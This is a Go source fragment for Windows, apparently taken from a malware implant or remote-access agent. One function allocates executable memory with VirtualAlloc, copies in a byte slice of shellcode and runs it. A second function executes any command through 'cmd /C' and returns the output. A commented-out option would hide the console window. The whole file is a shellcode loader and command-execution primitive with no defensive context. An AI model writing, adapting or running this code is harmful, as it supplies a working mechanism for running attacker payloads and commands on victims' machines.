package main

import (
	"os/exec"
	"syscall"
	"unsafe"
)

func SyscallExecute(Shellcode []byte) bool {

	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}

	go syscall.Syscall(Addr, 0, 0, 0, 0)
	return true
}

func cmdOut(command string) (string, error) {
	cmd := exec.Command("cmd", "/C", command)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.CombinedOutput()
	out := string(output)
	return out, err
}